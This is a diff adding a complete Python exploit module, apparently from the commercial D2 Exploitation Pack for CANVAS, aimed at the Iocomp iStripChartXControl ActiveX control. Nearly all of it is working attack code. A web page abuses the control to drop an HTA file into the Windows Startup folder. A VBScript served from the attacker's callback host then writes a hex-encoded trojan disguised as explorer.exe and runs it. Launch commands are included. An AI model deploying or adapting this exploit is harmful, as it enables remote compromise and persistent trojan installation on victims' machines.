@@ -1,0 +1,205 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2016
+#
+
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import *
+from httpclientside import httpclientside
+from libs.canvasos import *
+from MOSDEF import pelib 
+
+import urllib
+import struct
+
+# GUI info
+NAME = "Iocomp Software iStripChartXControl.ocx ActiveX Control Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote code execution vulnerability in Iocomp Software iStripChartXControl.ocx"
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = ""
+DOCUMENTATION["VersionsAffected"] = "Iocomp Software 5.0"
+DOCUMENTATION["References"] = ""
+DOCUMENTATION["CVE Name"] = ""
+DOCUMENTATION["CVE Url"] = ""
+DOCUMENTATION["Notes"] = ""
+
+VERSION='1.0'
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY={}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Clientside'
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+NOTES="""
+Usage:
+.\commandlineInterface.py -p 5555 -v 1
+.\exploits\httpserver\httpserver.py -v 1 -O singleexploit:d2sec_iocomp2 -l 192.168.1.1 -d 5555 -p 80
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0 : ["All"], 
+}
+
+class theexploit(tcpexploit,httpclientside):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        httpclientside.__init__(self)
+        self.clientversion = 1
+        self.badstring = "\x00"
+        self.subesp = 0
+        self.name = NAME 
+        self.filename = "index.html"
+        self.scriptname = "d.vbs"              
+        return
+
+
+    def file4hta(self, exename):
+		evilprog = "explorer.exe"
+		e = []
+		
+		for a in exename:
+			for b in a:
+				if b == "\r":
+				  d = "0d"
+				elif b == "\n":
+				  d = "0a"
+				elif b == "\0":
+				  d = "00"
+				else:
+				  c = hex(ord(b))
+				  d = c.replace("0x", "")
+				
+				if len(d) == 1:
+				  d = "0"+d
+				
+				e.append(d)
+		
+		i = 0
+		j = 0
+		l = len(e)
+		
+		hta = "function d2()\n"
+		while 1:
+		  hta += " prog = prog & \""
+		
+		  while i != 24:
+		    hta += "%s," % e[j]
+		    if j == l-1:
+		      break
+		    i += 1
+		    j += 1
+		
+		  if j == l-1:
+		    hta = hta[:-1] + "\"\n\n"
+		    break
+		  hta += "\"\n"
+		  i = 0
+		
+		hta += " tmp = Split(prog, \",\")\n"	
+		hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
+		hta += " Set shell = CreateObject(\"WScript.Shell\")\n"
+		hta += " userprofile = shell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n"
+		hta += " path = userprofile & \"\\\" & \"%s\"\n" % evilprog
+		hta += " Set f = fso.CreateTextFile(path, True)\n\n"
+		hta += " For i = 0 To UBound(tmp)\n"
+		hta += "   prog = Int(\"&H\" & tmp(i))\n"
+		hta += "   f.Write Chr(prog)\n"
+		hta += " Next\n\n"
+		hta += " f.Close\n"
+		hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"
+		hta += " self.Close\n"		
+		hta += "End function\n"		
+		return hta 
+
+
+    def maketrojan(self):		
+		t_os = canvasos("Windows")
+		t_os.arch = "X86"    
+		self.buildmosdeftrojan(self.callback.ip, self.callback.port, http=True, target_os = t_os)                
+		self.htafile = self.file4hta(self.mosdeftrojan)
+		
+    		        
+    def makefile(self):
+        filedata = """
+<HTML> 
+<BODY>
+ 
+<DIV id="targetDiv">
+
+</DIV>
+
+<SCRIPT language="javascript">  
+
+try {		
+	var detect = new ActiveXObject("iStripChartXControl.iStripChartX");
+	
+	if (detect) {				
+		document.getElementById("targetDiv").innerHTML = "<object classid='clsid:D1120C80-28C7-11D3-85BF-00105AC8B715' id='target'>";
+		    
+        target.TitleText = unescape("MOSDEFVB");
+        target.SaveToXMLFile("C:/Documents and Settings/All Users/Start Menu/Programs/Startup/d2.hta");		        
+	}        		
+}
+catch(e) {}
+
+</SCRIPT> 
+
+</BODY> 
+</HTML>            
+"""     
+        vb = "<SCRIPT language=vbs src=" + "http://" + self.callback.ip + "/" + self.scriptname + "></SCRIPT><SCRIPT>d2()</SCRIPT>"           
+        filedata = filedata.replace("MOSDEFVB", urllib.quote("</Title><D2><![CDATA[ >" + vb + "<]]></D2><Title>"))        
+
+        if self.useSSL:
+      		filedata = filedata.replace('http:', 'https:')
+	
+        return filedata
+
+    def makesploit(self, clientheader, clientbody):        
+        from libs.spkproxy import header, body
+        h = header('SERVER')
+        b = body()                     
+                
+        if clientheader.URL.count(self.filename):            
+            sploitstring = self.makefile()            
+            b.setBody(sploitstring)      
+        elif clientheader.URL.count(self.scriptname):
+            self.maketrojan()                 
+            self.log("Sending VBScript file")            
+            h.addHeader("Content-type","binary/octet-stream")
+            h.addHeader("Connection","close")            
+            b.setBody(self.htafile)                         
+        else:
+            self.log('Redirecting to self')
+            h.status = '302'
+            h.addHeader('Location', self.filename)
+            h.addHeader('Content-Type', 'binary/octet-stream')
+        return h, b
+
+    def neededListenerTypes(self):
+        from canvasengine import HTTPMOSDEF
+        return [HTTPMOSDEF]
+    
+    def run(self):        
+        return 1
+
+if __name__=='__main__':
+    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
